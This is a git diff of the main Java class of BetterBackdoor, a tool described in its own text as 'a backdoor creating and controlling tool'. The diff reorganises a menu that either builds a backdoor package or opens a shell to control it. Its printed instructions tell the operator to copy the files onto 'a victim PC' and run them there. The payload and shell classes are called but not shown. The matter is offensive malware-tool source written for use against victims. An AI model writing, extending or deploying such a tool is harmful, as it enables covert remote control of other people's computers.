@@ -12,6 +12,11 @@ public class BetterBackdoor {
 	public final static Scanner sc = new Scanner(System.in);
 	public final static String os = System.getProperty("os.name");
 
+	/**
+	 * Starts BetterBackdoor.
+	 * 
+	 * @param args command line arguments
+	 */
 	public static void main(String[] args) {
 		System.out.println("_________        __    __              __________                __       .___\n"
 				+ "\\_____   \\ _____/  |__/  |_  __________\\______   \\______    ____ |  | __ __| _/____   ___________ \n"
@@ -19,49 +24,48 @@ public class BetterBackdoor {
 				+ " |    |   \\  ___/|  |  |  | \\  ___/|  | \\/    |   \\ / __ \\\\  \\___|    </ /_/ (  <_> |  <_> )  | \\/\n"
 				+ " |______  /\\___  >__|  |__|  \\___  >__|  |______  /(____  /\\___  >__|_ \\____ |\\____/ \\____/|__|\n"
 				+ "        \\/     \\/                \\/             \\/      \\/     \\/     \\/    \\/");
-		System.out.println("Welcome to BetterBackdoor");
-		System.out.println("A backdoor creating and controlling tool.\n");
+		System.out.println("Welcome to BetterBackdoor\n");
 		System.out.println("Select:");
 		System.out.println("[0] Create backdoor");
 		System.out.println("[1] Open backdoor shell");
 		String choice = getInput("op01");
-		if (choice.equals("1"))
+		if (choice.equals("0")) {
+			boolean jre = false;
+			if (os.contains("Windows")) {
+				System.out.println(
+						"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
+				jre = Boolean.parseBoolean(getInput("yn"));
+			} else
+				System.out.println(
+						"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
+								+ "in the current working directory create folder 'jre' containing 'bin' and 'lib' directories from a Windows JRE distribution.\n");
+			System.out.println("Press ENTER to create backdoor...");
+			sc.nextLine();
+			System.out.println("Creating...\n");
+			try {
+				Setup.create(jre);
+			} catch (Exception e) {
+				if (e.getMessage() == null)
+					error("Could not create backdoor");
+				else
+					error("Could not create backdoor:\n" + e.getMessage());
+			}
+			System.out.println("Created!\n");
+			System.out.println(
+					"To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC.\n"
+							+ "If a JRE is packaged with the backdoor, execute run.bat, otherwise execute run.jar.\n"
+							+ "This will start the backdoor on the victim's PC.\n"
+							+ "To control the backdoor, return to BetterBackdoor and run option 1 at start.\n");
+			System.out.println("Press ENTER to exit...");
+			sc.nextLine();
+		} else
 			Shell.start();
-		boolean jre = false;
-		if (os.contains("Windows")) {
-			System.out.println(
-					"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?(y/n):");
-			jre = Boolean.parseBoolean(getInput("yn"));
-		} else if (os.contains("Linux") || os.contains("Mac"))
-			System.out.println(
-					"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
-							+ "create folder 'jre' in current directory with 'bin' and 'lib' folders from a Windows JRE distribution.\n");
-		System.out.println("Place all desired '.duck' DuckyScripts and '.ps1' PowerShell scripts in scripts\n");
-		System.out.println("Press ENTER to create backdoor...");
-		sc.nextLine();
-		System.out.println("Creating...\n");
-		try {
-			Setup.create(jre);
-		} catch (Exception e) {
-			error("Could not create backdoor:\n" + e.getMessage());
-		}
-		System.out.println("Created!\n");
-		try {
-			Thread.sleep(1000);
-		} catch (InterruptedException e) {
-		}
-		System.out.println(
-				"To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC.\n"
-						+ "If you packaged a JRE with the backdoor, execute run.bat, otherwise execute run.jar.\n"
-						+ "This will start the backdoor on the victim's PC.\n");
-		System.out.println("Press ENTER to exit...");
-		sc.nextLine();
 	}
 
 	/**
-	 * Get user input and verify it's validity with {@link type}.
+	 * Gets user input and verify it's validity with {@link type}.
 	 *
-	 * @param type type of input needed
+	 * @param type type of input
 	 * @return user input
 	 */
 	public static String getInput(String type) {
@@ -92,9 +96,9 @@ public class BetterBackdoor {
 	}
 
 	/**
-	 * Displays error message.
+	 * Displays "An error occurred" followed by {@link errorMessage} and exits.
 	 *
-	 * @param errorMessage message to display
+	 * @param errorMessage error message to display
 	 */
 	public static void error(String errorMessage) {
 		System.out.println("An error occurred:\n" + errorMessage + "\n");
